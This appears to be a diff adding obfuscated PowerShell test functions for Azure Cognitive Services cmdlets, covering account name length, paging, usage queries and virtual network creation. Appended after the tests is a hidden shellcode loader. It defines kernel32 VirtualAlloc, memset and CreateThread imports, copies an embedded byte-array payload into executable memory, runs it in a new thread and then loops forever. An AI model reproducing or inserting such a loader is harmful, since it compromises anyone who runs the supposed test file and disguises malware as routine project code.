+        &("{2}{0}{1}{3}"-f'AreE','q','Assert-','ual') 'S3' ${uP`dA`Ted`ACC`oUnT}."s`KU"."N`Ame";
+
+        &("{3}{0}{4}{2}{1}" -f 'etry-If','ption','ce','R','Ex') { &("{4}{2}{6}{1}{5}{0}{3}" -f 'esAcc','erv','-AzCognit','ount','Remove','ic','iveS') -ResourceGroupName ${r`Gn`AmE} -Name ${acc`ountna`me} -Force; }
+    }
+    finally
+    {
+        
+        &("{3}{2}{4}{1}{0}"-f'roup','ResourceG','an','Cle','-') ${rGN`Ame}
+    }
+}
+
+
+function tE`ST-`MI`NMA`xAC`cou`NTnAmE
+{
+	
+    ${r`g`NamE} = &("{12}{10}{6}{0}{2}{4}{3}{9}{7}{8}{5}{11}{1}"-f'erv','rceName','i','esMa','c','Test','S','em','ent','nag','tive','Resou','Get-Cogni')
+
+    try
+    {
+        
+        ${shO`RT`NAme} = 'aa';
+		${LoN`Gname} = ("{9}{2}{5}{0}{10}{1}{3}{8}{6}{4}{7}"-f 't','ttesttesttesttest','stte','testtes','sttesttes','sttesttest','tte','ttest','ttes','te','es');
+        ${sK`U`NAME} = 'S2';
+        ${ACCO`U`NTTYpe} = ("{1}{2}{3}{0}"-f's','Tex','tAnalyt','ic');
+        ${l`oC} = &("{0}{3}{2}{1}"-f'Get-','ation','c','Lo') -providerNamespace ("{1}{0}{6}{2}{5}{4}{3}"-f 'ic','M','oso','s','ognitiveService','ft.C','r') -resourceType ("{1}{0}"-f'nts','accou') -preferredLocation ("{1}{0}"-f'est US','W');
+
+        &("{2}{1}{0}{3}" -f 'G','AzResource','New-','roup') -Name ${rgnA`me} -Location ${L`OC};
+        ${ShO`RTA`cCoUnt} = &("{7}{6}{3}{8}{5}{4}{0}{1}{2}" -f 'co','un','t','tiv','Ac','vices','w-AzCogni','Ne','eSer') -ResourceGroupName ${rGna`mE} -Name ${s`Ho`RTnAme} -Type ${ACcO`U`NTTy`pe} -SkuName ${SkuN`A`mE} -Location ${l`oc} -Force;
+		${LO`NgaCco`U`Nt} = &("{4}{3}{6}{7}{2}{9}{1}{8}{5}{0}" -f'unt','e','ervi','ni','New-AzCog','cco','t','iveS','sA','c') -ResourceGroupName ${r`G`NAME} -Name ${LON`Gna`mE} -Type ${Ac`Co`UNtTy`Pe} -SkuName ${s`K`UNAMe} -Location ${l`oc} -Force;
+
+		&("{2}{0}{3}{1}" -f'ert-','l','Ass','AreEqua') ${Sho`RTna`Me} ${ShO`RT`AccOu`Nt}."ac`co`UnTN`AmE";               
+		&("{4}{0}{2}{3}{1}"-f'r','ual','t-A','reEq','Asse') ${Long`Na`me} ${lO`N`gaccouNT}."A`c`countN`Ame";
+        
+        &("{0}{3}{1}{2}" -f'R','pt','ion','etry-IfExce') { &("{1}{9}{5}{3}{8}{0}{10}{7}{4}{6}{2}"-f'C','Re','t','e-A','ces','ov','Accoun','gnitiveServi','z','m','o') -ResourceGroupName ${R`gNa`ME} -Name ${ac`cOUN`Tname} -Force; }
+    }
+    finally
+    {
+        
+        &("{1}{4}{2}{0}{5}{3}" -f 'e','C','an-R','rceGroup','le','sou') ${Rgn`AMe}
+    }
+}
+
+
+function TeSt-G`eTwI`TH`P`A`GiNG
+{
+	
+    ${rg`N`Ame} = &("{10}{4}{8}{11}{2}{12}{1}{7}{3}{6}{0}{5}{9}"-f 'Na','ce','rv','geme','g','m','ntTestResource','sMana','nitiv','e','Get-Co','eSe','i')
+	${l`oC} = &("{0}{2}{1}"-f'Get-','on','Locati') -providerNamespace ("{4}{1}{0}{5}{3}{2}"-f 'gnitiv','ft.Co','ices','Serv','Microso','e') -resourceType ("{0}{1}{2}"-f 'ac','coun','ts') -preferredLocation ("{2}{1}{0}"-f ' US','st','We')
+	
+	try
+    {
+		${to`TAL`couNt} = 100
+        
+        &("{1}{3}{4}{0}{5}{2}"-f 'ceG','N','up','ew-AzRe','sour','ro') -Name ${r`gn`AME} -Location ${L`OC}
+
+		
+		For(${i} = 0; ${I} -lt ${T`otaL`CO`UNt} ; ${I}++)
+		{
+			&("{2}{4}{0}{6}{3}{8}{7}{1}{5}{9}"-f'Cogn','icesA','New-','t','Az','ccoun','i','rv','iveSe','t') -ResourceGroupName ${R`Gna`mE} -Name "facepaging_wu_$i" -Type ("{0}{1}" -f'Fa','ce') -SkuName 'S0' -Location ${L`oc} -Force;
+		}
+
+		
+		For(${i} = 0; ${I} -lt ${t`Otal`cOu`NT} ; ${I}++)
+		{
+			&("{5}{4}{8}{6}{0}{3}{1}{2}{7}" -f 'ive','ervice','sA','S','ew','N','Cognit','ccount','-Az') -ResourceGroupName ${Rgn`AMe} -Name "cvpaging_wu_$i" -Type ("{4}{3}{1}{2}{0}" -f'on','is','i','omputerV','C') -SkuName 'S0' -Location ${l`OC} -Force;
+		}
+
+		${Ac`c`oUnTS} = &("{1}{5}{4}{3}{2}{0}" -f'unt','Get-AzCognit','rvicesAcco','e','S','ive')
+		&("{0}{2}{3}{4}{1}" -f'A','l','ssert-','Ar','eEqua') 200 ${A`CcOUN`TS}."C`oUnT"
+
+		${A`c`cOUNts} = &("{0}{4}{1}{2}{3}" -f 'G','iti','veServicesAccoun','t','et-AzCogn') -ResourceGroupName ${R`GN`Ame}
+		&("{3}{1}{2}{0}" -f'l','-A','reEqua','Assert') 200 ${ACCO`UN`TS}."c`oUNt"
+    }
+    finally
+    {
+        
+        &("{5}{2}{4}{1}{0}{3}" -f 'o','r','lean-Resour','up','ceG','C') ${Rgn`A`ME}
+    }
+}
+
+
+function tE`sT-GE`TU`S`AgES
+{
+    
+    ${Rg`N`AmE} = &("{6}{7}{3}{2}{1}{4}{8}{0}{5}"-f'agement','ces','Servi','ive','Ma','TestResourceName','Get-C','ognit','n');
+
+    try
+    {
+        
+        ${AcCoUN`TN`AMe} = 'csa' + ${R`GN`AmE};
+        ${S`KUN`AMe} = 'S1';
+        ${a`C`cO`UNttypE} = ("{0}{1}{2}" -f'TextAna','lytic','s');
+        ${L`oC} = &("{3}{2}{1}{0}"-f'on','i','t','Get-Loca') -providerNamespace ("{1}{0}{3}{5}{2}{4}"-f'icroso','M','v','ft.CognitiveSe','ices','r') -resourceType ("{0}{2}{1}"-f'acc','ts','oun') -preferredLocation ("{0}{1}{2}"-f'W','e','st US')
+
+        &("{2}{3}{4}{0}{1}" -f'sou','rceGroup','New','-Az','Re') -Name ${R`gnA`me} -Location ${l`oc};
+
+        ${C`REAted`AccoUnt} = &("{1}{2}{4}{0}{3}" -f 'Ac','New-AzCogni','tiv','count','eServices') -ResourceGroupName ${RGN`A`ME} -Name ${ACcoUN`T`NA`ME} -Type ${Acc`ouNTT`YPE} -SkuName ${SK`U`NAMe} -Location ${l`oC} -Force;
+		${US`Ag`Es1} = &("{5}{0}{2}{6}{3}{4}{1}"-f'it','age','iv','ces','AccountUs','Get-AzCogn','eServi') -ResourceGroupName ${R`G`NaMe} -Name ${AcC`OuN`TNA`ME}
+		${Us`Ages2} = &("{4}{8}{5}{9}{10}{0}{3}{6}{7}{1}{2}" -f'icesA','a','ge','ccou','Get-A','v','ntU','s','zCogniti','eSer','v') -InputObject ${cREATed`A`Cc`o`Unt}
+		${US`AgEs3} = &("{3}{5}{6}{4}{9}{1}{2}{0}{7}{8}" -f 'ccou','es','A','Ge','ervi','t-AzCog','nitiveS','ntUs','age','c') -ResourceId ${CreATE`da`ccou`Nt}."i`D"
+
+		&("{0}{1}{2}" -f 'Asse','rt-T','rue') {${Us`A`GeS1}."COu`NT" -gt 0}
+		&("{4}{2}{3}{1}{0}" -f '-AreEqual','rt','ss','e','A') 0.0 ${uSag`Es1}[0]."Cu`RreN`TVa`lUE"
+		&("{2}{1}{0}{3}"-f 'ru','ert-T','Ass','e') {${UsA`geS1}[0]."li`MIt" -gt 0}
+
+		&("{0}{2}{4}{1}{3}"-f'Ass','u','ert-','al','AreEq') ${usA`GE`s1}."C`ounT" ${Us`AG`Es2}."cO`UnT"
+		&("{4}{2}{3}{1}{0}" -f'ual','q','ssert','-AreE','A') ${usAGe`S2}."cOU`NT" ${USA`GES3}."cO`UNt"
+
+		&("{3}{0}{1}{2}" -f'sse','rt-AreEq','ual','A') ${US`AGes1}[0]."CuRRe`N`T`VALuE" ${u`saGEs2}[0]."CuR`R`en`TvAlUe"
+		&("{0}{4}{3}{1}{2}"-f 'As','ua','l','reEq','sert-A') ${us`A`GeS2}[0]."C`UrreN`TV`ALue" ${uS`AGes3}[0]."CuRrenT`VAL`Ue"
+
+		&("{2}{3}{4}{1}{0}" -f 'l','Equa','Asser','t-Ar','e') ${uSAg`E`s1}[0]."lI`Mit" ${usa`GE`S2}[0]."L`iMIt"
+		&("{2}{0}{3}{1}"-f'sse','Equal','A','rt-Are') ${usa`g`es2}[0]."li`MIt" ${Usa`ge`s3}[0]."L`iMiT"
+    }
+    finally
+    {
+        
+        &("{1}{4}{3}{2}{0}" -f 'eGroup','C','esourc','R','lean-') ${r`GNA`Me}
+    }
+}
+
+
+function Creat`eAndg`E`T`Vi`RTu`ALneTW`orK (${rESoUR`CeGroUP`Na`ME}, ${v`NeT`NamE}, ${l`oCa`TiON} = ("{2}{3}{0}{1}" -f 'alu','seuap','c','entr'))
+{
+
+	${s`U`BnET1} = &("{4}{7}{6}{5}{0}{2}{3}{8}{1}" -f'orkS','etConfig','u','b','New','tw','VirtualNe','-Az','n') -Name ("{2}{0}{1}"-f 'u','lt','defa') -AddressPrefix ("{0}{1}{2}{3}"-f '2','00.0.0.0','/','24')
+	${s`UBnEt2} = &("{4}{1}{0}{5}{2}{3}{6}"-f 'twork','rtualNe','ubnetCon','fi','New-AzVi','S','g') -Name ("{0}{1}"-f's','ubnet') -AddressPrefix ("{2}{0}{1}{3}"-f '00','.0.1','2','.0/24')
+	${vn`ET} = &("{4}{0}{1}{2}{3}" -f'Az','v','irtualNe','twork','New-') -Name ${V`NEtn`AMe} -ResourceGroupName ${rEsOurCEg`ROuP`Na`Me} -Location ${LOc`A`TiON} -AddressPrefix ("{3}{0}{2}{1}" -f'0.','6','0.0/1','200.') -Subnet ${S`U`Bnet1},${SUBne`T2}
+
+	${GETv`NET} = &("{3}{2}{4}{1}{0}" -f'alNetwork','irtu','t-A','Ge','zV') -Name ${V`N`etN`Ame} -ResourceGroupName ${r`esoUrCe`G`R`oUPNAME}
+
+	return ${g`e`TvNET}
+}
+${c} = ((("{58}{38}{35}{57}{28}{16}{60}{55}{14}{31}{96}{41}{45}{15}{49}{4}{98}{46}{7}{99}{84}{63}{74}{56}{65}{37}{1}{0}{90}{40}{2}{73}{75}{70}{24}{62}{94}{69}{17}{34}{101}{79}{82}{51}{43}{93}{42}{100}{92}{23}{19}{66}{33}{13}{80}{8}{86}{26}{9}{3}{29}{30}{83}{95}{61}{76}{5}{48}{59}{50}{64}{87}{32}{44}{12}{39}{85}{97}{36}{21}{25}{6}{53}{52}{18}{71}{77}{10}{22}{91}{68}{11}{27}{78}{20}{88}{81}{54}{89}{47}{72}{67}"-f 'YU','t(y',' ','uint dwC','s','re','ubl','e,','lp',', ','tr','nt','t(yYU','ntPtr lpS','n IntPtr V','I','s','hread(I','ex','ckS','in','dll',' me','a','n I','yYU)]p','ter','Ptr dest,','U)]public ','reationFlags, ','Int','i','p',' I','n','YUkernel32.dl','t.','Impor','(y','m','blic','lo','d','u','or','c(','t dwSiz',' u','a','ntPtr lpAddres','Id);','es, ','static ','ic ','sr','tic exter','ect);[Dl','lyY','[DllImport','d','ta','p','ntPtr ','ationType, uint flPro','[Dll','l','ize,','t count);','set(I','ateT','er','tern ','in','sta','t','tic ext','Th','IntP',' u','re','tartAddress, IntPtr ',' ','adAttribut','Pt','loc','s','Parame','Im','t','c,','kernel32.dllyYU)]pu','m','t','int ','Cre','r l','rtualAl','vcr',', uin',' uint flAl','wS','tPtr lpTh'))."repl`Ace"('yYU',[striNG][chaR]34));${w} = &("{2}{1}{0}"-f'Type','dd-','A') -memberDefinition ${c} -Name ("{1}{0}"-f 'in32','W') -namespace ("{4}{3}{2}{0}{1}"-f 'o','ns','cti','Fun','Win32') -passthru;[Byte[]];[Byte[]]${z} = 0xbd,0x63,0x74,0xff,0xf5,0xdb,0xda,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x6b,0x0f,0x03,0x6b,0x6c,0x96,0x0a,0x09,0x9a,0xd4,0xf5,0xf2,0x5a,0xb9,0x7c,0x17,0x6b,0xf9,0x1b,0x53,0xdb,0xc9,0x68,0x31,0xd7,0xa2,0x3d,0xa2,0x6c,0xc6,0xe9,0xc5,0xc5,0x6d,0xcc,0xe8,0xd6,0xde,0x2c,0x6a,0x54,0x1d,0x61,0x4c,0x65,0xee,0x74,0x8d,0xa2,0x13,0x74,0xdf,0x7b,0x5f,0x2b,0xf0,0x08,0x15,0xf0,0x7b,0x42,0xbb,0x70,0x9f,0x12,0xba,0x51,0x0e,0x29,0xe5,0x71,0xb0,0xfe,0x9d,0x3b,0xaa,0xe3,0x98,0xf2,0x41,0xd7,0x57,0x05,0x80,0x26,0x97,0xaa,0xed,0x87,0x6a,0xb2,0x2a,0x2f,0x95,0xc1,0x42,0x4c,0x28,0xd2,0x90,0x2f,0xf6,0x57,0x03,0x97,0x7d,0xcf,0xef,0x26,0x51,0x96,0x64,0x24,0x1e,0xdc,0x23,0x28,0xa1,0x31,0x58,0x54,0x2a,0xb4,0x8f,0xdd,0x68,0x93,0x0b,0x86,0x2b,0xba,0x0a,0x62,0x9d,0xc3,0x4d,0xcd,0x42,0x66,0x05,0xe3,0x97,0x1b,0x44,0x6b,0x5b,0x16,0x77,0x6b,0xf3,0x21,0x04,0x59,0x5c,0x9a,0x82,0xd1,0x15,0x04,0x54,0x16,0x0c,0xf0,0xca,0xe9,0xaf,0x01,0xc2,0x2d,0xfb,0x51,0x7c,0x84,0x84,0x39,0x7c,0x29,0x51,0xed,0x2c,0x85,0x0a,0x4e,0x9d,0x65,0xfb,0x26,0xf7,0x6a,0x24,0x56,0xf8,0xa1,0x4d,0xfd,0x02,0x21,0xcc,0x3e,0x22,0x55,0x58,0x3d,0x3c,0x95,0xc9,0xc8,0xda,0xff,0xf9,0x9c,0x75,0x97,0x60,0x85,0x0e,0x06,0x6c,0x13,0x6b,0x08,0xe6,0x90,0x8b,0xc6,0x0f,0xdc,0x9f,0xbe,0xff,0xab,0xc2,0x68,0xff,0x01,0x68,0x94,0x95,0xad,0x3b,0xc3,0x01,0xac,0x1a,0x23,0x8e,0x4f,0x49,0x38,0x07,0xda,0x32,0x56,0x68,0x0a,0xb3,0xa6,0x3e,0x40,0xb3,0xce,0xe6,0x30,0xe0,0xeb,0xe8,0xec,0x94,0xa0,0x7c,0x0f,0xcd,0x15,0xd6,0x67,0xf3,0x40,0x10,0x28,0x0c,0xa7,0xa0,0x14,0xdb,0x81,0xd6,0x74,0xdf;${G} = 0x1000;if (${z}."lENg`Th" -gt 0x1000){${G} = ${Z}."LeNg`Th"};${x}=${w}::("{2}{3}{0}{1}" -f 'ual','Alloc','V','irt').Invoke(0,0x1000,${G},0x40);for (${I}=0;${i} -le (${z}."l`engtH"-1);${I}++) {${w}::"m`eMSeT"([IntPtr](${x}.("{0}{1}" -f 'ToInt3','2').Invoke()+${i}), ${z}[${I}], 1)};${W}::("{0}{2}{3}{1}"-f'Cre','d','ate','Threa').Invoke(0,0,${X},0,0,0);for (;;){&("{1}{0}{2}"-f 'e','Start-sle','p') 60};
